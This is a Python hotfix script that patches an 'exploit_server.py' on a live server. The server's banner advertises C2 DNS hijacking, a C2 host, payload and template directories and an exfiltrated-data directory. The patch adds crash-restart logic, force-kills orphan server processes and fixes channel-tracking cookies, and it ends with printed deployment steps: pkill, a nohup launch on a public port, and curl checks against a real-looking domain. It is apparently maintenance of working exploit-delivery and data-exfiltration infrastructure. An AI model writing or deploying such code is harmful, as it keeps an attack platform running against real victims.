# -*- coding: utf-8 -*-
"""
v204 hotfix15v4 - Fixed order + banner alignment.
  FIX-A PATCH1: Apply LAST main-tail banner block FIRST (large offset 187k+,
                does not shift earlier PATCH3 offsets).  Regex only matches the
                banner block that contains both "EXPLOIT SERVER - READY" and
                "Access URL:", and requires Python indent >= 4 spaces.
  FIX-B PATCH2: Insert PREFLIGHT-PURGE kill-orphan-worker block right above
                the real main-tail banner.
  FIX-C PATCH3: Finally apply the earlier "expires" cookie block (smaller
                absolute offset 119xxx) - since PATCH1 ran first and never
                touched bytes before ~187k, PATCH3's original absolute offset
                still matches exactly.
"""
import os, sys, time, shutil, ast, re

SELF_FILE = os.path.abspath(__file__)
try:
    with open(SELF_FILE, 'r', encoding='utf-8') as _me:
        ast.parse(_me.read())
    print('[SELF-AST-OK] ✅ hotfix15v4 self AST PASS')
except SyntaxError as _e:
    print(f'[SELF-AST-FAIL] ❌ L{_e.lineno} off={_e.offset}: {_e.msg}')
    sys.exit(2)

PROJ   = '/www/wwwroot/coruna/server'
ESFILE = os.path.join(PROJ, 'exploit_server.py')
BAKDIR = os.path.join(PROJ, 'bak_v204_hotfix15v4')
os.makedirs(BAKDIR, exist_ok=True)

ts = time.strftime('%Y%m%d%H%M%S')
bak = os.path.join(BAKDIR, f'exploit_server.py.bak-{ts}')
shutil.copy2(ESFILE, bak)
ORIG_SIZE = os.path.getsize(ESFILE)
print(f'[BAK] {bak} (size={ORIG_SIZE})')

with open(ESFILE, 'rb') as f:
    src_bytes = f.read()
ORIG_NL = b'\r\n' if src_bytes.count(b'\r\n') > src_bytes.count(b'\n') * 0.5 else b'\n'
src = src_bytes.decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n')
lines = src.split('\n')
N_LINES = len(lines)
print(f'[INFO] ORIG_NL={ORIG_NL!r} total lines={N_LINES} orig_size={len(src)}')

# ═══════════════════════════════════════════════════════════════
# STEP 1: 定位 PATCH1 + PATCH3 的 ORIG src absolute offset
#   不用复杂正则 → 直接枚举每个 banner=f""", 判断下 30 行内
#   是否同时包含 "EXPLOIT SERVER - READY" 与 "Access URL:"
# ═══════════════════════════════════════════════════════════════
BANNER_HITS = []
for _m in re.finditer(r'^(?P<ind>[ \t]{4,})banner\s*=\s*f"""\s*$', src, flags=re.MULTILINE):
    _L = 1 + src[:_m.start()].count('\n')
    _end_body = _m.end()
    # 切 banner=f 后面 <= 12000 chars 片段 (至多 120 lines)
    SEG = src[_end_body : _end_body + 12000]
    # 只看向下 40 行
    lines_after = SEG.split('\n', 42)[:42]
    joined_tail = '\n'.join(lines_after)
    has_ready = 'EXPLOIT SERVER - READY' in joined_tail
    has_access = 'Access URL:' in joined_tail
    has_server_shutdown = bool(re.search(r'^\s*server\.shutdown\(\)', SEG, flags=re.MULTILINE))
    BANNER_HITS.append((_m.start(), _m, len(_m.group('ind')), has_ready, has_access, has_server_shutdown, _L))
print(f'[PATCH1-LOC] banner=f""" total occurrences N={len(BANNER_HITS)}')
for i, (off, _m, ind_n, hr, ha, hsd, L) in enumerate(BANNER_HITS):
    tag = ("✅ REAL main-tail" if (hr and ha and ind_n >= 4) else "   other (comment/docstring)")
    print(f'  #{i+1} L{L} offset={off} indent_n={ind_n} READY={hr!s:5s} ACCESS={ha!s:5s} has_shutdown={hsd!s:5s} {tag}')
REAL_BANNERS = [(off, _m, ind_n, hr, ha, hsd, L) for (off, _m, ind_n, hr, ha, hsd, L) in BANNER_HITS if hr and ha and ind_n >= 4]
if not REAL_BANNERS:
    print('[FATAL P1] 未找到 EXPLOIT+ACCESS+indent>=4 banner. 用 L3894 fallback:')
    # fallback: 直接用之前探的 L3894
    L_FB = 3894 - 1
    if 0 <= L_FB < len(lines) and 'banner = f"""' in lines[L_FB]:
        ind_m = re.match(r'^([ \t]+)', lines[L_FB])
        TI = ind_m.group(1) if ind_m else '    '
        OFF_FB = sum(len(lines[k]) + 1 for k in range(L_FB))
        # 向下找最后 server.shutdown() 作为 P1_END
        seg_fb = src[OFF_FB:]
        sdlist = [s.start() for s in re.finditer(r'server\.shutdown\(\)', seg_fb)]
        if not sdlist:
            print('[FATAL P1 fallback] no server.shutdown() after banner'); shutil.copy2(bak, ESFILE); sys.exit(5)
        nl_after = seg_fb.find('\n', sdlist[-1])
        if nl_after < 0: nl_after = len(seg_fb)
        P1_START, P1_END = OFF_FB, OFF_FB + nl_after
        TI_N = len(TI)
        print(f'[PATCH1-FALLBACK L3894] OFFSET {P1_START}:{P1_END} len={P1_END-P1_START} TI_N={TI_N}')
    else:
        print('[FATAL P1 fallback FAIL] L3894 不是 banner'); shutil.copy2(bak, ESFILE); sys.exit(5)
else:
    P1_OBJ = REAL_BANNERS[-1]   # 最后一个一定是 main 尾部
    P1_START, _m, TI_N, _hr, _ha, _hsd, L_START = P1_OBJ
    TI = _m.group('ind')
    # 从 banner 起点向后扫描 找最后 1 个 server.shutdown() 作为结束
    SEG_AFTER = src[P1_START : P1_START + 18000]
    sd_matches = [mm.start() for mm in re.finditer(r'server\.shutdown\(\)', SEG_AFTER)]
    if not sd_matches:
        print(f'[FATAL P1] banner L{L_START} 后没 server.shutdown()'); shutil.copy2(bak, ESFILE); sys.exit(5)
    LAST_SD_REL = sd_matches[-1]
    # server.shutdown() 所在行行尾作为 P1_END
    nl_pos = SEG_AFTER.find('\n', LAST_SD_REL)
    if nl_pos < 0: nl_pos = len(SEG_AFTER)
    P1_END = P1_START + nl_pos
    print(f'[PATCH1-SELECT] 用最后一个 #{len(REAL_BANNERS)} L{L_START} OFFSET {P1_START}:{P1_END} len={P1_END-P1_START} TI_N={TI_N}')
OLD_P1 = src[P1_START:P1_END]
print(f'[PATCH1 OLD HEAD] (top 180):')
for _l in OLD_P1[:180].splitlines()[:6]: print(f'  │ {_l[:180]}')
print(f'[PATCH1 OLD TAIL] (last 220):')
for _l in OLD_P1[-220:].splitlines()[-8:]: print(f'  │ {_l[:180]}')

# ═══════════════════════════════════════════════════════════════
# STEP 2: PATCH1 先应用! (因为在文件最后面 >187k, 改了不影响 PATCH3 的 119k offset)
#   不用 f-string (嵌套 {{}} 容易漏). 用字符串模板 + 占位符 T0/T1/T2/T3/T4 替换 indent
# ═══════════════════════════════════════════════════════════════
T0 = TI               # 4  spaces (main() 函数体, banner 赋值语句)
T1 = T0 + '    '      # 8  spaces (try 内部 / while True 语句体)
T2 = T1 + '    '      # 12 spaces (except / if 子句)
T3 = T2 + '    '      # 16 spaces (嵌套 if / 内层 try)
T4 = T3 + '    '      # 20 spaces (最内层 except)
NEW_P1 = (
T0 + 'banner = f"""\n'
'╔══════════════════════════════════════════════════════════════╗\n'
'║              EXPLOIT SERVER - READY                          ║\n'
'╠══════════════════════════════════════════════════════════════╣\n'
'║  Access URL:     http://{args.host}:{args.port}/\n'
'║                  http://localhost:{args.port}/\n'
'║  C2 DNS hijack:  Internal DNS -> {args.host}:80 (if bound)\n'
'║  Payloads dir:   {PAYLOADS_DIR}\n'
'║  Templates dir:  {TEMPLATES_DIR}\n'
'║  Exfil data dir: {EXFIL_DIR}\n'
'║  Log file:       {LOG_FILE}\n'
'║  DB available:   {DB_AVAILABLE}\n'
'╚══════════════════════════════════════════════════════════════╝\n'
'"""\n'
+ T0 + 'if C2_HOST:\n'
+ T1 + 'banner += f"║  C2 Host:        {C2_HOST}\\\\n"\n'
+ T0 + 'if REDIRECT_URL:\n'
+ T1 + 'banner += f"║  Redirect URL:   {REDIRECT_URL}\\\\n"\n'
+ T0 + 'banner += "╚══════════════════════════════════════════════════════════════╝\\\\n"\n'
+ T0 + 'banner += "\\\\n[!] Press Ctrl+C to stop\\\\n"\n'
+ T0 + '\n'
+ T0 + 'print(banner)\n'
+ T0 + 'startup_log = f"Exploit server started on http://{args.host}:{args.port} | DB={DB_AVAILABLE}"\n'
+ T0 + 'log_to_file(startup_log)\n'
+ T0 + 'log_to_file(f"Payloads: {PAYLOADS_DIR}")\n'
+ T0 + 'log_to_file(f"Exfil dir: {EXFIL_DIR}")\n'
+ T0 + 'log_to_file(f"Log file: {LOG_FILE}")\n'
+ T0 + '\n'
+ T0 + '# PATCH v20.4-HOTFIX15v4-R1: DS-READY-HF15v4 marker + self-connect probe + while True 永不返回\n'
+ T0 + 'import socket as _diag_sk, os as _diag_os, sys as _diag_sys, time as _diag_tm\n'
+ T0 + 'try:\n'
+ T1 + '_ds_pid  = _diag_os.getpid()\n'
+ T1 + '_ds_ppid = _diag_os.getppid()\n'
+ T1 + '_ds_pgid = _diag_os.getpgrp() if hasattr(_diag_os, "getpgrp") else -1\n'
+ T1 + 'print(f"[DS-READY-HF15v4] pid={_ds_pid} ppid={_ds_ppid} pgid={_ds_pgid} port={args.port} -> ENTER INFINITE serve_forever LOOP", flush=True)\n'
+ T1 + '_diag_sys.stdout.flush(); _diag_sys.stderr.flush()\n'
+ T1 + '_s1 = _diag_sk.socket(_diag_sk.AF_INET, _diag_sk.SOCK_STREAM)\n'
+ T1 + '_rr = _s1.connect_ex(("127.0.0.1", int(args.port)))\n'
+ T1 + 'print(f"[DS-READY-HF15v4] self-connect_ex 127.0.0.1:{args.port}={_rr} (0=LISTEN OK)", flush=True)\n'
+ T1 + '_s1.close()\n'
+ T0 + 'except Exception as _diag_e:\n'
+ T1 + 'print(f"[DS-READY-HF15v4] probe err {type(_diag_e).__name__}: {_diag_e}", flush=True)\n'
+ T0 + '\n'
+ T0 + '_ds_attempt = 0\n'
+ T0 + 'while True:\n'
+ T1 + '_ds_attempt += 1\n'
+ T1 + 'print(f"[DS-SF-LOOP] attempt={_ds_attempt} -> server.serve_forever(poll=0.3)", flush=True)\n'
+ T1 + 'try:\n'
+ T2 + 'server.serve_forever(poll_interval=0.3)\n'
+ T1 + 'except KeyboardInterrupt:\n'
+ T2 + 'stop_msg = "Server stopped by user."\n'
+ T2 + 'print(f"\\\\n[*] {stop_msg}")\n'
+ T2 + 'try: log_to_file(stop_msg)\n'
+ T2 + 'except Exception: pass\n'
+ T2 + 'try: server.shutdown()\n'
+ T2 + 'except Exception: pass\n'
+ T2 + 'break\n'
+ T1 + 'except SystemExit as _ds_se:\n'
+ T2 + 'print(f"[DS-SF-EXIT] SystemExit(code={_ds_se.code}) -> propagate.", flush=True)\n'
+ T2 + 'try: log_to_file(f"[DS-SF-EXIT] SystemExit {_ds_se.code}")\n'
+ T2 + 'except Exception: pass\n'
+ T2 + 'raise\n'
+ T1 + 'except BaseException as _ds_sf_e:\n'
+ T2 + 'import traceback as _ds_tb\n'
+ T2 + '_ts = _diag_tm.strftime("%Y-%m-%d %H:%M:%S")\n'
+ T2 + '_msg = f"[DS-CRASH-SF-{_ds_attempt}] [{_ts}] pid={_ds_pid} {type(_ds_sf_e).__name__}: {_ds_sf_e}"\n'
+ T2 + 'print(_msg, flush=True)\n'
+ T2 + 'try: log_to_file(_msg)\n'
+ T2 + 'except Exception: pass\n'
+ T2 + '_ds_tb.print_exc()\n'
+ T2 + 'if _ds_attempt >= 5:\n'
+ T3 + 'print(f"[DS-CRASH-SF] serve_forever crash {_ds_attempt} times -> SystemExit(88).", flush=True)\n'
+ T3 + 'raise SystemExit(88)\n'
+ T2 + 'print(f"[DS-CRASH-SF] 3s later retry {_ds_attempt+1}th serve_forever...", flush=True)\n'
+ T2 + 'try:\n'
+ T3 + '_diag_tm.sleep(3)\n'
+ T2 + 'except (KeyboardInterrupt, SystemExit): pass\n'
+ T2 + 'try: server.shutdown()\n'
+ T2 + 'except Exception: pass\n'
+ T2 + 'try: server.server_close()\n'
+ T2 + 'except Exception: pass\n'
+ T2 + '_diag_tm.sleep(2)\n'
+ T2 + 'try:\n'
+ T3 + 'print(f"[DS-SF-REBIND] attempt {_ds_attempt+1} rebind ReusableThreadingHTTPServer...", flush=True)\n'
+ T3 + 'server = ReusableThreadingHTTPServer((args.host, args.port), DarkSwordHandler)\n'
+ T2 + 'except Exception as _rebind_e:\n'
+ T3 + 'print(f"[DS-SF-REBIND] failed: {type(_rebind_e).__name__}: {_rebind_e}", flush=True)\n'
+ T3 + '_diag_tm.sleep(2)\n'
+ T0 + 'print(f"[DS-SF-LOOP-END] KeyboardInterrupt/SystemExit -> main done.", flush=True)\n'
+ T0 + 'server.shutdown()'
)
# Self-diagnose: NEW_P1 语法 (不能独立 compile 但至少缩进一致)
def _count_indent(s):
    return len(s) - len(s.lstrip(' '))
lines_new = NEW_P1.split('\n')
bad = [(_count_indent(x), i+1, x[:80]) for i,x in enumerate(lines_new) if x.strip() and not x.startswith(('╔','║','╠','╚','"'))]
print(f'[PATCH1 NEW_P1 diag] non-boxy non-empty lines={len(bad)}: first 10 indent/L/code:')
for ind,lnno,cd in bad[:10]: print(f'  ind={ind:2d} L{lnno:3d}: {cd}')
print(f'  indent distribution (T0={len(T0)}, T1={len(T1)}, T2={len(T2)}, T3={len(T3)}):',
      sorted(set(x[0] for x in bad)))

src = src[:P1_START] + NEW_P1 + src[P1_END:]
print(f'[PATCH1] ✅ 替换 {len(OLD_P1)} chars → {len(NEW_P1)} chars (delta={len(NEW_P1)-len(OLD_P1):+d})')
try:
    ast.parse(src); print('[PATCH1 AST] ✅ PASS')
except SyntaxError as e:
    print(f'[PATCH1 AST] ❌ L{e.lineno} off={e.offset}: {e.msg}')
    fl = src.split('\n')
    for ek in range(max(1, e.lineno-4), min(len(fl), e.lineno+4)):
        print(f'  L{ek:4d}|{fl[ek-1][:180]}')
    shutil.copy2(bak, ESFILE); sys.exit(6)

# ═══════════════════════════════════════════════════════════════
# STEP 3: PATCH3 expires 应用! (PATCH1 在后面>187k先改完了, PATCH3 在 119k 不影响)
# ═══════════════════════════════════════════════════════════════
# 策略: 用正则找 "if tpl_slug:\n ... expires=...86400...\n Set-Cookie tpl=...\n"
#        + "# Preserve channel info\n" + "if log_cid\n ... ds_chid=...{expires}\n"
#        + "if log_tid\n ... ds_tpid=...{expires}"
_P3_PAT = re.compile(
    r'(?P<ind>[ \t]+)if\s+tpl_slug\s*:\s*\n'
    r'(?P=ind)[ \t]*expires\s*=\s*"Expires="\s*\+\s*.*?86400\)\.strftime.*?GMT"\s*\n'
    r'(?P=ind)[ \t]*self\.send_header\("Set-Cookie",\s*f"tpl=\{urllib\.parse\.quote\(tpl_slug\)\}.*?SameSite=Lax"\)\s*\n'
    r'(?P=ind)[ \t]*#\s*Preserve\s+channel\s+info\s+for\s+legacy\s+Coruna\s*\n'
    r'(?P=ind)[ \t]*if\s+log_cid\s*:\s*\n'
    r'(?P=ind)[ \t]*self\.send_header\("Set-Cookie",\s*f"ds_chid=\{log_cid\};\s*Path=/;\s*\{expires\};\s*SameSite=Lax"\)\s*\n'
    r'(?P=ind)[ \t]*if\s+log_tid\s*:\s*\n'
    r'(?P=ind)[ \t]*self\.send_header\("Set-Cookie",\s*f"ds_tpid=\{log_tid\};\s*Path=/;\s*\{expires\};\s*SameSite=Lax"\)',
    re.DOTALL
)
_P3_ALL = [m for m in _P3_PAT.finditer(src)]
print(f'[PATCH3-LOC] tpl_slug+log_cid+log_tid {expires} blocks: N={len(_P3_ALL)}')
if len(_P3_ALL) < 1:
    print('[FATAL P3] 找不到 tpl_slug + log_cid {expires} 块!'); shutil.copy2(bak, ESFILE); sys.exit(7)
# 从后往前 replace 保持 offset 一致 (其实 N=1 直接替换即可)
for _i, _m in sorted(enumerate(_P3_ALL), key=lambda x: -x[1].start()):
    P3S, P3E = _m.start(), _m.end()
    IND_P3 = _m.group('ind')
    IP3 = len(IND_P3)
    SI3 = IND_P3
    DI3 = SI3 + '    '
    print(f'[PATCH3 #{_i+1}] OFFSET {P3S}:{P3E} = {P3E-P3S}chars indent={IP3}')
    NEW_P3 = (
    SI3 + '# PATCH v20.4-HOTFIX15v4-PATCH3: expires init empty to avoid UnboundLocalError when tpl_slug is empty but log_cid/log_tid is int (fixes curl(52) Empty reply)\n'
    + SI3 + "expires = ''\n"
    + SI3 + 'try:\n'
    + DI3 + 'if tpl_slug:\n'
    + DI3 + '    expires = "Expires=" + __import__("datetime").datetime.utcfromtimestamp(__import__("time").time() + 86400).strftime("%a, %d-%b-%Y %H:%M:%S GMT")\n'
    + DI3 + '    self.send_header("Set-Cookie", f"tpl={urllib.parse.quote(tpl_slug)}; Path=/; {expires}; SameSite=Lax")\n'
    + DI3 + '# Preserve channel info for legacy Coruna\n'
    + DI3 + 'if log_cid:\n'
    + DI3 + '    self.send_header("Set-Cookie", f"ds_chid={log_cid}; Path=/; {expires}; SameSite=Lax")\n'
    + DI3 + 'if log_tid:\n'
    + DI3 + '    self.send_header("Set-Cookie", f"ds_tpid={log_tid}; Path=/; {expires}; SameSite=Lax")\n'
    + SI3 + 'except Exception as _hf15v4_p3_e:\n'
    + DI3 + 'try:\n'
    + DI3 + '    import admin.common as _ac15\n'
    + DI3 + '    if _ac15 and hasattr(_ac15, "log_to_file"):\n'
    + DI3 + '        _ac15.log_to_file(f"[EXPIRES-FALLBACK] do_GET cookie write err: {_hf15v4_p3_e}")\n'
    + DI3 + '    else:\n'
    + DI3 + '        print(f"[EXPIRES-FALLBACK] do_GET cookie err={_hf15v4_p3_e}", flush=True)\n'
    + DI3 + 'except Exception:\n'
    + DI3 + '    pass'
    )
    src = src[:P3S] + NEW_P3 + src[P3E:]
    print(f'[PATCH3 #{_i+1}] ✅ replaced {P3E-P3S} → {len(NEW_P3)} chars')

try:
    ast.parse(src); print('[PATCH3 AST] ✅ PASS')
except SyntaxError as e:
    print(f'[PATCH3 AST] ❌ L{e.lineno} off={e.offset}: {e.msg}')
    fl = src.split('\n')
    for ek in range(max(1, e.lineno-4), min(len(fl), e.lineno+4)):
        print(f'  L{ek:4d}|{fl[ek-1][:180]}')
    shutil.copy2(bak, ESFILE); sys.exit(8)

# ═══════════════════════════════════════════════════════════════
# STEP 4: PATCH2 PREFLIGHT-PURGE 在 PATCH1 后的 banner=f 上一行插入
# ═══════════════════════════════════════════════════════════════
_P1_NEW_POS = src.find(TI + 'banner = f"""\n╔══════════════════════════════════════════════════════════════╗\n'
                            '║              EXPLOIT SERVER - READY                          ║')
if _P1_NEW_POS < 0:
    print('[PATCH2 WARN] NEW src 找不到 banner=╔══... 精确块 → 降级 re.finditer last banner')
    _P1B_ALL = list(re.finditer(TI.replace('[',r'\[').replace(']',r'\]') + r'banner\s*=\s*f"""', src))
    if _P1B_ALL:
        _P1_NEW_POS = _P1B_ALL[-1].start()
if _P1_NEW_POS > 0:
    INSERT_AT = _P1_NEW_POS
    PURGE = (
    '\n'
    + T0 + '# PATCH v20.4-HOTFIX15v4-R2: PREFLIGHT-PURGE kill orphan exploit_server.py PIDs (exclude self/nginx/mysqld)\n'
    + T0 + 'try:\n'
    + T1 + 'import subprocess as _ds_sp, signal as _ds_sg, os as _ds_os, time as _ds_tm\n'
    + T1 + '_my_pid = _ds_os.getpid()\n'
    + T1 + 'try:\n'
    + T2 + '_ps_out = _ds_sp.run(["pgrep", "-af", "exploit_server.py"],\n'
    + T2 + '                      stdout=_ds_sp.PIPE, stderr=_ds_sp.DEVNULL, timeout=4, check=False).stdout.decode("utf-8","ignore")\n'
    + T1 + 'except Exception:\n'
    + T2 + '_ps_out = ""\n'
    + T1 + '_kp = []\n'
    + T1 + 'for _pln in _ps_out.splitlines():\n'
    + T2 + 'try:\n'
    + T3 + '_parts = _pln.split(None, 1)\n'
    + T3 + 'if not _parts: continue\n'
    + T3 + '_p = int(_parts[0])\n'
    + T3 + 'if _p != _my_pid and _p > 1 and _p != _ds_os.getppid():\n'
    + T4 + '_cmd = (_parts[1] if len(_parts) > 1 else "").lower()\n'
    + T4 + 'if ("exploit_server" in _cmd) and ("nginx" not in _cmd) and ("mysqld" not in _cmd):\n'
    + '    ' + T4 + '_kp.append(_p)\n'
    + T2 + 'except Exception:\n'
    + T3 + 'continue\n'
    + T1 + 'if _kp:\n'
    + T2 + 'print(f"[PREFLIGHT-PURGE] clean orphan exploit_server PIDs={sorted(_kp)} (self={_my_pid})", flush=True)\n'
    + T2 + 'for _p in _kp:\n'
    + T3 + 'try: _ds_os.kill(_p, _ds_sg.SIGKILL)\n'
    + T3 + 'except Exception: pass\n'
    + T2 + '_ds_tm.sleep(1.5)\n'
    + T0 + 'except Exception:\n'
    + T1 + 'pass\n'
    )
    src = src[:INSERT_AT] + PURGE + src[INSERT_AT:]
    print(f'[PATCH2-R2] ✅ PREFLIGHT-PURGE inserted @ offset {INSERT_AT} ({len(PURGE)} chars)')
    try:
        ast.parse(src); print('[PATCH2 AST] ✅ PASS')
    except SyntaxError as e:
        print(f'[PATCH2 AST] ❌ L{e.lineno}: {e.msg}'); shutil.copy2(bak, ESFILE); sys.exit(9)

# ═══════════════════════════════════════════════════════════════
# FINAL AST + WRITE
# ═══════════════════════════════════════════════════════════════
try:
    ast.parse(src); print('[FINAL AST] ✅ PASS')
except SyntaxError as e:
    print(f'[FINAL AST] ❌ L{e.lineno} off={e.offset}: {e.msg}')
    fl = src.split('\n')
    for ek in range(max(1, e.lineno-4), min(len(fl), e.lineno+4)):
        print(f'  L{ek:4d}|{fl[ek-1][:180]}')
    shutil.copy2(bak, ESFILE); sys.exit(10)

if ORIG_NL == b'\r\n': fb = src.replace('\n', '\r\n').encode('utf-8')
else: fb = src.encode('utf-8')
with open(ESFILE, 'wb') as f: f.write(fb)
NEW_SIZE = os.path.getsize(ESFILE)
print(f'[WRITE] before={ORIG_SIZE} after={NEW_SIZE} delta={NEW_SIZE-ORIG_SIZE:+d}')

def gline(pattern, text):
    return sorted(set(1 + text[:m.start()].count('\n') for m in re.finditer(pattern, text)))

checks = [
    ('DS-READY-HF15v4',  r'DS-READY-HF15v4'),
    ('DS-SF-LOOP',       r'DS-SF-LOOP'),
    ('PREFLIGHT-PURGE',  r'PREFLIGHT-PURGE'),
    ('EXPIRES-FALLBACK', r'EXPIRES-FALLBACK'),
    ('self-connect_ex=0',r'self-connect_ex.*=\s*0'),
    ('UnboundLocalError check: no ds_chid.*{expires} outside try',
        r'(?<!try:\n[^\n]*\n[^\n]*)ds_chid=\{log_cid\}; Path=/; \{expires\}'),
]
print('[VERIFY markers]')
for name, pat in checks:
    hits = gline(pat, src)
    if name.startswith('UnboundLocal'):
        if not hits:
            print(f'  ✅ UnboundLocal risk 清零: 所有 ds_chid=...{{expires}} 均在 try 段内')
        else:
            print(f'  ⚠️  还有潜在 {len(hits)} 处 ds_chid {{expires}} 未进 try段: L={hits}')
    else:
        tag = '✅' if hits else '❌'
        print(f'  {tag} {name:<20s} L={hits}')

# 反向扫描每个 tpl_slug if 块,确保下面 log_cid/log_tid 的 {expires} 上面都有 expires = '' 初始化
print('[VERIFY per-block] scanning each if tpl_slug: block for safe expires= init:')
_blocks = list(re.finditer(r'if\s+tpl_slug\s*:', src))
for _bi, _bm in enumerate(_blocks):
    _L = 1 + src[:_bm.start()].count('\n')
    _seg = src[_bm.start() : _bm.start()+1400]
    _has_init = bool(re.search(r'expires\s*=\s*[\'\"]{2}', _seg[:300]))
    _has_usage = bool(re.search(r'(ds_chid|ds_tpid)=.*\{expires\}', _seg[:1200]))
    tag = '✅ OK' if (not _has_usage or _has_init) else '❌ BUG'
    print(f'  block #{_bi+1} L{_L}: init={_has_init} use_cookie={_has_usage} → {tag}')
print('✅ HOTFIX15v4 APPLY DONE')
print()
print('='*72)
print('启动流程:')
print('  1. Supervisor stop + 改 autostart/autorestart=false (持久化, 下次重启不 respawn)')
print('     /www/server/panel/pyenv/bin/supervisorctl stop coruna_exploit:coruna_exploit_00')
print('     find /etc/supervisor -name "*.conf" | xargs grep -l coruna_exploit → 改该 conf')
print('     sed -i "s/^autostart=true/autostart=false/; s/^autorestart=true/autorestart=false/" <coruna_exploit.conf>')
print('     /www/server/panel/pyenv/bin/supervisorctl reread ; /www/server/panel/pyenv/bin/supervisorctl update')
print('  2. 清场:  pkill -9 -f exploit_server.py ; sleep 2 ; ss -lntp | grep :7070 (应空)')
print('  3. 启动:  export DS_SKIP_PREFLIGHT_SETSID=1')
print('           cd /www/wwwroot/coruna/server')
print('           nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 -u exploit_server.py -H 0.0.0.0 -p 7070 --no-port-80 > /tmp/exploit_server.log 2>&1 &')
print('           echo NEW_PID=$!')
print('  4. 10s 后 grep markers:')
print('     grep -nE "PREFLIGHT-PURGE|DS-READY-HF15v4|DS-SF-LOOP|DS-CRASH-SF|self-connect_ex|EXPIRES-FALLBACK|UnboundLocalError" /tmp/exploit_server.log')
print('  5. CURLx4:')
print('     C1: curl -sS -o /dev/null -w "C1 T001 %{http_code} %{size_download}\\n" --max-time 8 http://127.0.0.1:7070/ch/test001')
print('     C2: curl -sS -o /dev/null -w "C2 non  %{http_code} %{redirect_url}\\n" --max-time 8 http://127.0.0.1:7070/ch/notexist_xyz')
print('     C3: curl -sk -o /dev/null -w "C3 HPST %{http_code} %{size_download}\\n" --max-time 15 https://aa1234.dpdns.org/ch/test001')
print('     C4: curl -sk -o /dev/null -w "C4 HPSn %{http_code} %{redirect_url}\\n" --max-time 15 https://aa1234.dpdns.org/ch/notexist_xyz')
